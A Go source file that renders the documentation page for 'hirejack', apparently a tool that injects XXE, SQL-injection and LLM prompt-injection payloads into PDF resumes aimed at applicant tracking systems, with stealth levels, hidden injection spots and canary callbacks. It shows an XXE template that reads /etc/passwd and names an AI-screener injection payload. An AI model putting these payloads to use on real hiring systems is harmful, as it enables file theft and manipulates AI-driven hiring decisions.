package server

import (
	"fmt"
	"html"
	"strings"

	"github.com/gofiber/fiber/v2"
	"hirejack/internal/payloads"
)

// ServeDocs serves the documentation page.
func (s *Server) ServeDocs(c *fiber.Ctx) error {
	c.Set("Content-Type", "text/html; charset=utf-8")
	return c.SendString(buildDocsHTML())
}

func buildDocsHTML() string {
	var b strings.Builder

	b.WriteString(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>hirejack docs</title>
<style>
:root {
  --bg: #0a0a0b;
  --panel: #111113;
  --border: #27272a;
  --text: #fafafa;
  --dim: #a1a1aa;
  --faint: #52525b;
  --accent: #22d3ee;
  --danger: #f87171;
  --warn: #fbbf24;
  --info: #60a5fa;
}
* { box-sizing: border-box; margin: 0; padding: 0; }
body {
  font-family: ui-monospace, monospace;
  background: var(--bg);
  color: var(--text);
  line-height: 1.6;
  padding: 2rem;
  max-width: 1200px;
  margin: 0 auto;
}
h1 { font-size: 1.5rem; margin-bottom: 0.5rem; }
h2 { font-size: 1.1rem; color: var(--accent); margin: 2rem 0 1rem; border-bottom: 1px solid var(--border); padding-bottom: 0.5rem; }
h3 { font-size: 0.95rem; color: var(--dim); margin: 1.5rem 0 0.5rem; }
p { color: var(--dim); margin-bottom: 1rem; }
a { color: var(--accent); }
code { background: var(--panel); padding: 0.15rem 0.4rem; border-radius: 3px; font-size: 0.85rem; }
pre { background: var(--panel); padding: 1rem; border-radius: 4px; overflow-x: auto; margin: 1rem 0; border: 1px solid var(--border); }
.back { display: inline-block; margin-bottom: 1.5rem; color: var(--faint); text-decoration: none; }
.back:hover { color: var(--accent); }
.category { background: var(--panel); border: 1px solid var(--border); border-radius: 4px; margin-bottom: 1.5rem; }
.category-header { padding: 0.75rem 1rem; border-bottom: 1px solid var(--border); display: flex; align-items: center; gap: 0.75rem; }
.category-name { font-weight: 600; }
.category-count { color: var(--faint); font-size: 0.8rem; }
.payload { padding: 0.6rem 1rem; border-bottom: 1px solid var(--border); }
.payload:last-child { border-bottom: none; }
.payload-id { color: var(--accent); font-weight: 500; }
.payload-desc { color: var(--dim); font-size: 0.85rem; margin-top: 0.25rem; }
.payload-meta { display: flex; gap: 1rem; margin-top: 0.35rem; font-size: 0.75rem; }
.badge { padding: 0.1rem 0.4rem; border-radius: 3px; }
.badge-danger { background: rgba(248,113,113,0.15); color: var(--danger); }
.badge-warn { background: rgba(251,191,36,0.15); color: var(--warn); }
.badge-info { background: rgba(96,165,250,0.15); color: var(--info); }
.toc { background: var(--panel); border: 1px solid var(--border); border-radius: 4px; padding: 1rem; margin-bottom: 2rem; }
.toc-title { font-size: 0.85rem; color: var(--faint); margin-bottom: 0.5rem; }
.toc-list { display: flex; flex-wrap: wrap; gap: 0.5rem; }
.toc-link { color: var(--dim); text-decoration: none; padding: 0.25rem 0.5rem; border: 1px solid var(--border); border-radius: 3px; font-size: 0.8rem; }
.toc-link:hover { border-color: var(--accent); color: var(--accent); }
.stealth { color: var(--faint); }
</style>
</head>
<body>
<a href="/" class="back">← back to tool</a>
<h1>hirejack payload documentation</h1>
<p>ATS security audit payloads for testing parsing vulnerabilities, injection points, and ML/LLM weaknesses.</p>
`)

	// TOC
	b.WriteString(`<div class="toc"><div class="toc-title">categories</div><div class="toc-list">`)
	for _, cat := range payloads.Registry {
		b.WriteString(fmt.Sprintf(`<a href="#%s" class="toc-link">%s (%d)</a>`, cat.ID, cat.Name, len(cat.Payloads)))
	}
	b.WriteString(`</div></div>`)

	// Categories
	for _, cat := range payloads.Registry {
		b.WriteString(fmt.Sprintf(`<div class="category" id="%s">`, cat.ID))
		b.WriteString(fmt.Sprintf(`<div class="category-header"><span class="category-name">%s</span><span class="category-count">%d payloads</span></div>`,
			html.EscapeString(cat.Name), len(cat.Payloads)))

		for _, p := range cat.Payloads {
			b.WriteString(`<div class="payload">`)
			b.WriteString(fmt.Sprintf(`<div class="payload-id">%s</div>`, html.EscapeString(p.ID)))
			if p.Description != "" {
				b.WriteString(fmt.Sprintf(`<div class="payload-desc">%s</div>`, html.EscapeString(p.Description)))
			}
			b.WriteString(`<div class="payload-meta">`)
			if p.Impact != "" {
				badgeClass := "badge-info"
				if p.Impact == "critical" {
					badgeClass = "badge-danger"
				} else if p.Impact == "high" {
					badgeClass = "badge-warn"
				}
				b.WriteString(fmt.Sprintf(`<span class="badge %s">%s</span>`, badgeClass, html.EscapeString(p.Impact)))
			}
			if len(p.Stealth) > 0 {
				min, max := p.Stealth[0], p.Stealth[len(p.Stealth)-1]
				if min == max {
					b.WriteString(fmt.Sprintf(`<span class="stealth">stealth L%d</span>`, min))
				} else {
					b.WriteString(fmt.Sprintf(`<span class="stealth">stealth L%d-%d</span>`, min, max))
				}
			}
			if len(p.Locations) > 0 {
				b.WriteString(fmt.Sprintf(`<span class="stealth">locations: %s</span>`, html.EscapeString(strings.Join(p.Locations, ", "))))
			}
			b.WriteString(`</div></div>`)
		}
		b.WriteString(`</div>`)
	}

	// How to add payloads
	b.WriteString(`
<h2>adding new payloads</h2>
<p>Payloads are defined in <code>internal/payloads/registry.go</code>. Each payload belongs to a category.</p>

<h3>payload structure</h3>
<pre>type Payload struct {
    ID          string   // unique identifier (e.g., "xxe_aws_metadata")
    Name        string   // human-readable name
    Description string   // what it does
    Impact      string   // "critical", "high", "medium", "low"
    Stealth     []int    // stealth levels 1-5 (higher = harder to detect)
    Locations   []string // where to inject: "metadata", "xmp", "xfa", "content"
    Template    string   // the actual payload content (use {{.Variable}} for templating)
}</pre>

<h3>example: adding an xxe payload</h3>
<pre>Payload{
    ID:          "xxe_custom",
    Name:        "Custom XXE",
    Description: "Attempts to read /etc/passwd via external entity",
    Impact:      "critical",
    Stealth:     []int{1, 2},
    Locations:   []string{"xmp", "metadata"},
    Template:    ` + "`" + `&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&amp;xxe;` + "`" + `,
}</pre>

<h3>template variables</h3>
<p>Use Go template syntax for dynamic values:</p>
<pre>{{.CanaryURL}}     - canary callback URL
{{.RandomID}}      - random identifier
{{.Timestamp}}     - current timestamp
{{.CustomField}}   - any field from custom_data in the API request</pre>

<h3>stealth levels</h3>
<pre>L1 - Obvious: easily detected by basic scanners
L2 - Low: simple obfuscation
L3 - Medium: encoding tricks, split payloads
L4 - High: parser differentials, timing-based
L5 - Maximum: polyglot, multi-stage, invisible</pre>

<h3>injection locations</h3>
<pre>metadata  - PDF Info dictionary (Author, Title, etc.)
xmp       - XMP metadata stream
xfa       - XFA forms (XML Forms Architecture)
content   - visible PDF content streams
orphan    - orphan objects not referenced in xref
font      - font name/encoding manipulation</pre>

<h2>api reference</h2>
<h3>GET /api/payloads</h3>
<p>Returns all payload categories and their payloads.</p>

<h3>POST /api/inject</h3>
<p>Inject payloads into a PDF.</p>
<pre>{
  "pdf": "base64-encoded-pdf",
  "payload_ids": ["sqli.basic", "xxe.dtd_external"],
  "stealth": 3,
  "add_canary": true,
  "canary_label": "my-test"
}</pre>

<h3>POST /api/generate</h3>
<p>Generate a new CV with payloads pre-injected.</p>
<pre>{
  "payload_ids": ["llm_injection.ignore_resume"],
  "stealth": 4
}</pre>

<h3>GET /api/callbacks</h3>
<p>View recorded canary callbacks (when ATS systems trigger injected payloads).</p>

</body>
</html>
`)

	return b.String()
}
